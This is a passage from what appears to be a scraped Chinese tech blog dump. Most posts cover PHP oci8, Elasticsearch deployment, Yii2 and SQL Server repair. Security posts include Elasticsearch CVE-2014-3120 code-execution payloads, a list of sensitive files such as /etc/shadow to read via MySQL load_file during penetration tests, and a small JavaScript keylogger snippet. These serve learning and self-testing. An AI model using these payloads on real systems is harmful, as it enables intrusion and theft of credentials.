Oracle</h3><p>下面我们开始安装oci8扩展，我们使用pecl进行安装，如果你安装不了，那就只有下载相应的软件包编译安装了，首先需要安装一些编译安装所需的软件，build-essential提供编译C的一些工具，php5-dev提供phpize等一些工具，至于php-pear就是pecl命令所需的包。<br><figure class=\"highlight q\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-<span class=\"built_in\">get</span> install build-essential</span><br><span class=\"line\">sudo apt-<span class=\"built_in\">get</span> install php5-<span class=\"built_in\">dev</span> php-pear</span><br></pre></td></tr></table></figure></p>\n<p>然后使用pecl安装，这里要注意不能直接使用<code>pecl install oci8</code>，因为这样是直接给php7安装扩展的，我们是5.4安装方法如下：<br><figure class=\"highlight cmake\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pecl <span class=\"keyword\">install</span> oci8-<span class=\"number\">2.0</span>.<span class=\"number\">10</span>  <span class=\"comment\">#PHP 5.2 - PHP 5.6</span></span><br></pre></td></tr></table></figure></p>\n<p>然后在php.ini中添加<code>extension=oci8.so</code><br>再一次访问<code>phpinfo()</code>可以看到如下内容则安装成功。<br><img src=\"https://img.alicdn.com/imgextra/i2/192713264/TB2jF7MkVXXXXb_XXXXXXXXXXXX_!!192713264.png\" alt=\" oci.png\"><br>然后我们可以使用代码测试下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"preprocessor\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"comment\">// Create connection to Oracle</span></span><br><span class=\"line\">\t<span class=\"variable\">$conn</span> = oci_connect(<span class=\"string\">\"system\"</span>, <span class=\"string\">\"test\"</span>, <span class=\"string\">\"//192.168.32.77/orcl.test.com\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!<span class=\"variable\">$conn</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$m</span> = oci_error();</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"variable\">$m</span>[<span class=\"string\">'message'</span>], <span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">exit</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">print</span> <span class=\"string\">\"Connected to Oracle!\"</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// Close the Oracle connection</span></span><br><span class=\"line\">\toci_close(<span class=\"variable\">$conn</span>);</span><br><span class=\"line\"><span class=\"preprocessor\">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>\n<p>至于Yii2下直接有这么一个扩展，<a href=\"http://www.yiiframework.com/extension/yii2-osi8pdo\" target=\"_blank\" rel=\"external\">yii2-osi8pdo</a>，扩展的使用不在本文的范围内。</p>\n<h2 id=\"写在最后\">写在最后</h2><p>妈蛋的，受不了了，安个mssql的扩展windows搞，搞不定。linux搞，搞不定。网上的文章各种抄，各种过期的东西，真是日了狗，鄙视一切胡乱抄写，胡乱转载的行为</p>\n<h3 id=\"参考链接\">参考链接</h3><ul>\n<li><a href=\"https://help.ubuntu.com/community/PHPOracle\" target=\"_blank\" rel=\"external\">https://help.ubuntu.com/community/PHPOracle</a></li>\n<li><a href=\"http://www.oracle.com/technetwork/articles/technote-php-instant-084410.html\" target=\"_blank\" rel=\"external\">http://www.oracle.com/technetwork/articles/technote-php-instant-084410.html</a></li>\n</ul>\n"},{"title":"linux设置开机自启动","url":"http://ohroot.com/2015/11/16/linux-auto-start/","content":"<p>linux设置开机自启动，探索记录</p>\n<a id=\"more\"></a>\n<p>Linux系统任何时候都运行在一个指定的运行级上，并且不同的运行级程序和服务都不同，所要完成的工作和要达到的目的也不同，系统可以在这些运行级之间进行切换，来完成不同的工作。</p>\n<h2 id=\"运行级别等级：\">运行级别等级：</h2><ul>\n<li>0        系统停机状态</li>\n<li>1        单用户模式，只准许root用户对系统进系维护</li>\n<li>2～5  多用户模式（其中3为字符界面、5为图形界面）</li>\n<li>6         重启启动</li>\n</ul>\n<p>在这里需要注意的是，在Debian系下level2～5是没有任何区别的。<br>使用以下命令，可以查看当前的运行级别：<code>runlevel</code><br>使用以下命令，可以切换运行级别：<code>init [123456]</code><br>例如，init 0表示关机，init 6表示重启。</p>\n<h2 id=\"一些命令\">一些命令</h2><p>设置开机自启动的命令<br>命令1：<code>chkconfig</code>，最好多系统都用这个<br>命令2：<code>update-rc.d</code> debian早期系统默认用这个<br>命令3：<code>insserv -d mysql</code> 这个debian7.6开始就是这个命令了<br>命令4：<code>sysv-rc-conf</code> 这个要安装</p>\n"},{"title":"mysql load_file函数一些敏感路径","url":"http://ohroot.com/2015/11/16/mysql-load-file/","content":"<p>本文列举一些load_file会涉及的一些目录，不定时更新<br><a id=\"more\"></a></p>\n<p>当渗透测试过程中我们会遇到mysql用户的权限比较大，我们可以写文件，但是不知道网站路径。或者有权限执行load_file()函数。列举下可以读取的一些路径。<br>以下路径大部分参考<a href=\"https://github.com/nuke99/sqlnuke/blob/master/inputs/packset.lst:linux:\" target=\"_blank\" rel=\"external\">sqlnuke中的配置文件</a><br>Linux系统<br><figure class=\"highlight haml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-<span class=\"ruby\"> /etc/passwd    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/shadow    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/group    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/hosts    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/issue</span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/apache2/logs/access.log    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/httpd/access.log    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/init.d/apache/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/init.d/apache2/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /usr/local/apache2/conf/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /usr/local/apache/conf/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /home/apache/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /home/apache/conf/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /opt/apache/conf/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/httpd/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/httpd/conf/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/apache/apache.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/apache/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/apache2/apache2.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/apache2/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /usr/local/apache2/conf/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /usr/local/apache/conf/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /opt/apache/conf/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /home/apache/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /home/apache/conf/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/apache2/sites-available/default    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/apache2/vhosts.d/default_vhost.<span class=\"keyword\">include</span>    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /var/www/vhosts/sitename/httpdocs/<span class=\"regexp\">/etc/init</span>.d/apache    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> /etc/nginx/nginx.conf</span></span><br></pre></td></tr></table></figure></p>\n<p>windows系统<br><figure class=\"highlight haml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-<span class=\"ruby\"> <span class=\"constant\">C</span><span class=\"symbol\">:/wamp/bin/apache/logs/access</span>.log    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> <span class=\"constant\">C</span><span class=\"symbol\">:/wamp/bin/mysql/mysql5</span>.<span class=\"number\">5.24</span>/wampserver.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> <span class=\"constant\">C</span><span class=\"symbol\">:/wamp/bin/apache/apache2</span>.<span class=\"number\">2.22</span>/conf/httpd.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> <span class=\"constant\">C</span><span class=\"symbol\">:/wamp/bin/apache/apache2</span>.<span class=\"number\">2.22</span>/conf/wampserver.conf    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> <span class=\"constant\">C</span><span class=\"symbol\">:/wamp/bin/apache/apache2</span>.<span class=\"number\">2.22</span>/conf/httpd.conf.build    </span><br><span class=\"line\"></span>-<span class=\"ruby\"> <span class=\"constant\">C</span><span class=\"symbol\">:/wamp/bin/apache/apache2</span>.<span class=\"number\">2.22</span>/conf/httpd.conf.build</span></span><br></pre></td></tr></table></figure></p>\n"},{"title":"Elasticsearch生产环境部署_配置","url":"http://ohroot.com/2015/09/09/configForElasticsearch2/","content":"<p>本文主要介绍Elasticsearch生产环境部署需要考虑的一些配置，自学&amp;分享</p>\n<a id=\"more\"></a>\n<p>ES的默认的很多参数都是不需要改的，当遇到性能问题时首先应该考虑的是增加节点，和优化数据结构。<br>下面列举一些需要注意的配置项，首先是一般大家都知道的配置项：</p>\n<ul>\n<li>cluster.name: elasticsearch_production 集群名称还是要改一下，不要使用默认的，万一你在哪个内网，然后一台测试的笔记本开启了ES不是自动就加入了集群。</li>\n<li>node.name: elasticsearch_005_data 节点名称，这个也改下把，自己也清楚。看日志也明白些</li>\n<li>path.data: /path/to/data1 数据存储路径</li>\n<li>path.logs: /path/to/logs 日志路径</li>\n<li>path.plugins: /path/to/plugins 插件路径<br>上面三个初始目录都在安装目录下，主要考虑重装不会因为覆盖丢失数据</li>\n<li><p>discovery.zen.minimum_master_nodes 这个配置项主要是用于防止“脑裂”问题，具体设施可以看这篇文章：<a href=\"http://xingxiudong.com/2015/01/05/resolve-elasticsearch-split-brain/\" target=\"_blank\" rel=\"external\">如何防止ElasticSearch集群出现脑裂现象</a></p>\n</li>\n<li><p>gateway.recover_after_nodes: n<br>这个设置主要防止不必要的数据处理，比如一个集群全部重启，然后有一个机器起的比较慢，然后机器就会组成集群，选出master，然后从备份中恢复出故障集群的数据。集群此时恢复正常。然后起的慢的机器又重启成功了，又会把数据同步到这台机器上并删除冗余数据。这项配置决定直到第n个节点可用才可以进行恢复操作</p>\n</li>\n<li>gateway.expected_nodes: 10 </li>\n<li><p>gateway.recover_after_time: 5m   这个配置一个是恢复的时间，上面配置的是5分钟<br>这三项要求首先等待n个节点恢复，然后等待5分钟或者10个节点已经加入了集群就开始数据恢复</p>\n</li>\n<li><p>discovery.zen.ping.multicast.enabled: false</p>\n</li>\n<li><p>discovery.zen.ping.unicast.hosts: [“host1”, “host2:port”]<br>ES通过UDP协议去发现节点，建议关闭multicast的自动发现节点机制，上面的配置主要一个是禁用multicast，一个是写出需要尝试连接的节点，如果有专门的master节点可以配置成master节点。</p>\n</li>\n<li><p>不要修改java的GC机制<br>线程池设置成内核数，比如八核机器就设置成8，很多阻塞的操作都是Lucene来操作的，比如硬盘读写。搜索的线程设置可以设置成内核数的三倍</p>\n</li>\n<li><p>Heap size设置<br>可以通过命令<code>export ES_HEAP_SIZE=10g</code>，或者启动时配置<code>./bin/elasticsearch -Xmx10g -Xms10g</code>，要让Xmx和Xms相等。也可以修改文件<code>./bin/elasticsearch.in.sh</code>,修改sh代码，修改相关配置<br>然后这个内存一般设置为内存的一半，因为还有内存要分配给Lucene使用。然后不管你有多大的内存，该项设置不要超过32GB，这个与JVM的一些特性有关<br>如果你是使用了服务的方式去启动ES，需要修改服务的配置文件<code>./bin/service/elasticsearch.conf</code>来实现相关配置。</p>\n</li>\n<li><p>内存交换<br>这个对于性能影响是致命的，可以使用命令<code>sudo swapoff -a</code>来暂时关闭，永久关闭需要编辑文件<code>/etc/fstab</code><br>也可以在配置文件中添加配置<code>bootstrap.mlockall: true</code>，这样jvm可以锁定这些内存，避免被交换到物理存储介质。</p>\n</li>\n<li><p>文件描述符<br>这个说法我也不知道对不对，或者叫文件句柄？反正就是file descriptor,这个主要是因为Lucene要打开很多文件，Elasticsearch要开启很多socket，在linux系统下这些都是通过文件来处理的，linux会限制每个进程开启的文件数，可以通过<code>sysctl -w vm.max_map_count=262144</code>来临时修改，或者修改配置文件<code>/etc/sysctl.conf</code>的<code>vm.max_map_count</code>设置，最后都要执行<code>sysctl -p</code>使设置生效。<br>然后我是通过elasticsearchservicewrapper来启动ES的这里还需要修改配置文件<code>./bin/service/elasticsearch</code>，将配置项<code>ULIMIT_N</code>前面的注释去掉，并配置相应的值，建议值是32000，然而我配置了64000。<br>查看是否设置成功<code>http://localhost:9200/_nodes/process?pretty</code>，里面的<code>max_file_descriptors</code>就是对应的值。</p>\n</li>\n</ul>\n"},{"title":"Elasticsearch生产环境部署_软硬件","url":"http://ohroot.com/2015/09/09/configForElasticsearch1/","content":"<p>本文主要考虑ES集群搭建时机器的硬件配置和软件选择，读了些老外的文章，分享下</p>\n<a id=\"more\"></a>\n<h2 id=\"硬件\">硬件</h2><p><strong>内存</strong> ，ES很多操作非常耗内存，推荐的最佳内存配置是64GB，32GB、16GB也是可以接受的，低于8GB可能就不太够用了，也不要大于64GB，会引起其他的内存问题。内存消耗高主要是查询需要内存，然后索引数据存储到硬盘也非常的耗内存</p>\n<p><strong>CPU</strong>，可选用2-8核不等的CPU，在CPU多核与CPU主频之间，尽量选择多核的CPU。这样可以使得集群更加适应并发。</p>\n<p><strong>硬盘</strong>  非常重要，很多系统瓶颈都在硬盘的读写速率上。建议采用SSD固态硬盘，当使用SSD时，linux系统要配置正确的I/O调度策略，命令<code>echo noop &gt; /sys/block/sda/queue/scheduler</code>。如果是一般的磁盘，尽量整速度快点的把，服务器raid建议做成raid0，因为ES已经有有主从分片的机制了。</p>\n<p><strong>网络</strong> 网速块集群间数据交互就快咯，建议上千兆或者万兆的。我就整了一个千兆网线然后接在千兆交换机上，当然机器也是千兆网口。<br>最后，建议不要使用什么大型机来代替集群的方案，但是可以使用类似像亚马逊EC2那种虚拟云主机，搞一堆云主机建集群也是可取的，这个我没玩过，看别人这么说的，不知道真实效率，这方面不是很懂。</p>\n<h2 id=\"软件\">软件</h2><p>这里说的软件主要是jvm，ES依赖jvm，选择的原则是最好选用最新的jvm，然后openjdk也是可行的。<br>这个问题又想起了心酸往事，当时搭建集群的时候，买了一批机器，然后机器中有一条内存条存在质量问题，普通的使用发现不了问题，完全正常，可是就是我大量索引数据到ES的时候就会出现jvm的报错，内存溢出之类的错误，以及伴随这个错误的一系列错误，当时拿着错误信息google各种姿势搜索，完全找不到解决方法。我当时就觉得是jvm的问题，然后各种版本安装，恨不得把所有版本安装一遍。这个问题折腾了我差不多一个多月，终于有一天，这个机器不堪凌辱，挂掉了，才发现是内存坏的。。。说多了都是泪。。。</p>\n"},{"title":"ElasticSearch安全问题","url":"http://ohroot.com/2015/09/08/safety-problem-of-elasticsearch/","content":"<p>这篇文章主要是研究下Elasticsearch的一些漏洞，因为自己开发的系统也用到了Elasticsearch，自己检测下，顺便学习下<br><a id=\"more\"></a><br>我主要看到的就是一个是CVE-2014-3120和CVE-2015-1427，至于什么配置不当，外网能访问不在考虑范围内，Elasticsearch本来就是没有认证的，应该在内网并且做安全配置的。</p>\n<h2 id=\"CVE-2014-3120\">CVE-2014-3120</h2><p>关于这儿漏洞主要就是script_fields里面允许执行代码，可以通过java代码执行系统命令，我找了网上的poc，在我1.6版本的ES上测试并没有能成功复现，为了阅读方便我也稍微格式化了json代码。通过后面的深入研究好像是这个已经修复了,详情可以看乌云关于CVE-2015-1427的分析。<a href=\"http://drops.wooyun.org/papers/5107\" target=\"_blank\" rel=\"external\">地址在这里</a><br>exp1：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://<span class=\"number\">192.168</span>.<span class=\"number\">32.152</span>:<span class=\"number\">9200</span>/_search?<span class=\"built_in\">source</span>=</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"size\"</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"string\">\"query\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">\"filtered\"</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">\"query\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">\"match_all\"</span>: &#123;&#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">\"script_fields\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">\"exp\"</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">\"script\"</span>: <span class=\"string\">\"import java.util.*;\\nimport java.io.*;\\nString str = \\\"\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\"ifconfig\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null)&#123;sb.append(str);&#125;sb.toString();\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>exp2<br><figure class=\"highlight nimrod\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://<span class=\"number\">192</span>.<span class=\"number\">168</span>.<span class=\"number\">32</span>.<span class=\"number\">150</span>:<span class=\"number\">9200</span>/_search?source=</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">\"size\"</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"string\">\"query\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">\"filtered\"</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">\"query\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">\"match_all\"</span>: &#123;&#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"string\">\"script_fields\"</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">\"exp\"</span>: &#123;</span><br><span class=\"line\">            <span class=\"string\">\"script\"</span>: <span class=\"string\">\"import java.util.*;\\nimport java.io.*;\\nFile f = new File(\\\"/tmp/12.txt\\\");if(f.exists())&#123;\\\"exists\\\".toString();&#125;BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f),\\\"UTF-8\\\"));bw.write(\\\"1233\\\");bw.flush();bw.close();if(f.exists())&#123;\\\"success\\\".toString();&#125;\"</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>freebuf上还有个功能强大的EXP，<a href=\"http://www.freebuf.com/tools/38025.html\" target=\"_blank\" rel=\"external\">地址在这里</a><br>漏洞修复方案：在配置文件elasticsearch.yml里设置<code>script.disable_dynamic: true</code></p>\n<h2 id=\"CVE-2015-1427\">CVE-2015-1427</h2><p>这个漏洞是上一个cve发生后，ES将脚本语言引擎换成了Groovy，并且加入了沙盒进行控制，危险的代码会被拦截，结果这次由于沙盒限制的不严格，沙盒代码黑名单中的Java危险方法过滤不全，从而导致的代码执行。<br>这个漏洞乌云有两篇文章专门讲述了这个漏洞：<a href=\"http://drops.wooyun.org/papers/5107\" target=\"_blank\" rel=\"external\">传送门1</a>、 <a href=\"http://drops.wooyun.org/papers/5142\" target=\"_blank\" rel=\"external\">传送门2</a> 。<br>修复方案：关闭groovy沙盒以已停止动态脚本的使用<code>script.groovy.sandbox.enabled: false</code><br>最新版也修复了这个漏洞</p>\n"},{"title":"Yii2学习资料整理","url":"http://ohroot.com/2015/09/06/YII-study/","content":"<p>自己学习YII框架还是走了不少坑，这里把学习资料整理下<br><a id=\"more\"></a></p>\n<p>建议先看慕课网的视频，可以快速有一个了解。然后去看权威指南，去查参考手册，去看各种doc，看多了就会写了</p>\n<p>首先是一些链接：</p>\n<ul>\n<li>官网   <a href=\"http://www.yiiframework.com/\" target=\"_blank\" rel=\"external\">地址请猛戳</a></li>\n<li>github   <a href=\"https://github.com/yiisoft/yii2\" target=\"_blank\" rel=\"external\">地址请猛戳</a></li>\n<li><p>英文guide   <a href=\"http://www.yiiframework.com/doc-2.0/guide-index.html\" target=\"_blank\" rel=\"external\">地址请猛戳</a></p>\n</li>\n<li><p>yiichina   <a href=\"http://www.yiichina.com/\" target=\"_blank\" rel=\"external\">地址请猛戳</a></p>\n</li>\n<li>Yii Framework 2.0 类参考手册  <a href=\"http://www.yiichina.com/doc/api/2.0\" target=\"_blank\" rel=\"external\">地址请猛戳</a></li>\n<li>Yii Framework 2.0 权威指南    <a href=\"http://www.yiichina.com/doc/guide/2.0\" target=\"_blank\" rel=\"external\">地址请猛戳</a></li>\n<li>深入理解Yii2.0 — 深入理解Yii2.0   <a href=\"http://www.digpage.com/\" target=\"_blank\" rel=\"external\">地址请猛戳</a></li>\n<li>踏得网  <a href=\"http://yii2.techbrood.com/\" target=\"_blank\" rel=\"external\">地址请猛戳</a></li>\n</ul>\n<p>然后是视频资源，这里只列一些我看过的：</p>\n<ul>\n<li>优酷资源 <a href=\"http://i.youku.com/u/UMjg4NTg1MzY4MA==/videos\" target=\"_blank\" rel=\"external\">地址请猛戳</a></li>\n<li>慕课网资源 <a href=\"http://www.imooc.com/index/search?words=yii\" target=\"_blank\" rel=\"external\">地址请猛戳</a></li>\n</ul>\n<p><strong> 2016-05-04更新 </strong></p>\n<ul>\n<li>awesome-yii2 大量干货，大量学习资料，各取所需把 <a href=\"https://github.com/forecho/awesome-yii2\" target=\"_blank\" rel=\"external\">地址请猛戳</a></li>\n</ul>\n"},{"title":"javascript键盘记录","url":"http://ohroot.com/2015/09/06/Keylogger-with-javascript/","content":"<p>记录一段键盘记录的js代码<br><a id=\"more\"></a></p>\n<p>代码如下<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">keyUp</span><span class=\"params\">(e)</span> </span>&#123;</span><br><span class=\"line\">       <span class=\"keyword\">var</span> keyChar=<span class=\"number\">0</span>,e=e||event;</span><br><span class=\"line\">       keyChar=e.keyCode||e.which||e.charCode;</span><br><span class=\"line\">       <span class=\"keyword\">var</span> key = <span class=\"built_in\">String</span>.fromCharCode(keyChar);</span><br><span class=\"line\">       <span class=\"built_in\">console</span>.log(<span class=\"string\">\"字符: \"</span> + key);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">document</span>.onkeyup = keyUp;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"关于sql server备份文件恢复的事儿","url":"http://ohroot.com/2015/09/06/something-about-sql-server/","content":"<p>好久都没写文了，怎么的也得刷新下博客了，最近拿到一个.bak文件，经过分析是sql server的备份文件，想把它数据移植到mysql中，于是就有了下文<br><a id=\"more\"></a><br>﻿<br>首先sql server中数据要移植到mysql中，在自带安装的SQL Server Management Studio中只发现了可以导出成sql文件的方法，但是这个sql格式好像是叫<code>T-SQL</code>，反正就是Mysql不能直接导入，如果这样的话，好像有些工具可以转换这种SQL文件，但是我并没有找到有详细说明文档的，stackoverflow上并没有找到合适的方法。</p>\n<p>对了这里顺便提一下.bak文件恢复到sql server的方法：可以使用SQL Server Management Studio，然后连接上之后，右击左侧数据库—&gt;选择还原数据库—&gt;选择设备-&gt;添加bak文件-&gt;等待恢复成功。恢复前还可以验证下bak文件，看看是否损坏什么的，避免浪费时间。</p>\n<p>其实，后面才是我最想写的。</p>\n<p>导入sql server之后，想舒舒服服的导入到mysql，简单的方法就是装个navicat，这个网上破解版很多，装了之后可以导出成dbf格式，然后再从dbf格式导入到mysql，全程无脑操作。</p>\n<p>后面问题来了，有一个bak文件导出不成功，报各种错，然后还提示啥<code>DBCC   CHECKDB</code>去查看原因。本人不太懂sql server。先开始是想到的是sql server版本问题，于是果断从2014降到2012，方法是重装，花了不少时间，发现有的表勉强能够导出了，但是还是有些要报错。</p>\n<p>最终我选择，试试这个<code>DBCC CHECKDB</code>命令，运行之后，等待了好久，才有反应。错误名字大概叫<code>CHECKDB 发现了 0 个分配错误和 多少 个一致性错误</code>，大概这么个意思。于是再一次google，我还是蛮幸运的，找到了解决办法，错误说明如下：</p>\n<p>一般情况下，引起分配错误的原因是磁盘损坏或突然停电；一致性错误可能是数据库中的表或索引坏，一般都可修复。<br>1、查看红色字体，并把有错误的数据库表名记录下来，或把索引损坏的表名记录下来。<br>2、把数据库设置为单用户模式，直接在查询分析器中执行以下语句即可：<br><code>EXEC sp_dboption &#39;dbname&#39;, &#39;single user&#39;, &#39;TRUE&#39;</code><br>上面语句我执行发现没开启啥存储过程，然后就搜砸开起存储过程。搜到了另一个高版本开启方法：<br><code>alter database dbname set SINGLE_USER with ROLLBACK IMMEDIATE</code><br>3、进入查询分析器执行如下语句：<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"operator\"><span class=\"keyword\">use</span>  dbname</span><br><span class=\"line\">dbcc checkdb（<span class=\"string\">'dbname'</span>,repair_allow_data_loss）<span class=\"comment\">-------修复数据库</span></span><br><span class=\"line\">dbcc checkdb (<span class=\"string\">'dbname'</span>,REPAIR_REBUILD)<span class=\"comment\">----------------修复数据库索引</span></span></span><br></pre></td></tr></table></figure></p>\n<p>4、再执行：<code>dbcc checkdb</code>，检测数据库，出现结果为：<br>CHECKDB 发现了0个分配错误和 0个一致性错误（在数据库 ‘dbname’ 中）。<br>数据库已经修复完毕。<br>5、取消单用户模式，即直接在查询分析器中执行以下语句即可：<br><code>EXEC sp_dboption &#39;dbname&#39;, &#39;single user&#39;,&#39;FALSE&#39;</code><br>对应的： <code>alter database dbname set MULTI_USER with ROLLBACK IMMEDIATE</code></p>\n<p>最终顺利搞定，真是伤脑筋。</p>\n"},{"title":"JS可以实现的一些好玩的功能","url":"http://ohroot.com/2015/06/24/JS可以实现的一些好玩的功能/","content":"<p>本文非原创，所写都是我验证过的，介绍JS可以实现的一些好玩的功能<br><a id=\"more\"></a></p>\n<p>本文主要还是收集了一些关于WebRTC的一些实用的例子，运用于信息收集，下文的资源都是别人写的，感谢大牛们的分享</p>\n<h2 id=\"IP地址获取\">IP地址获取</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 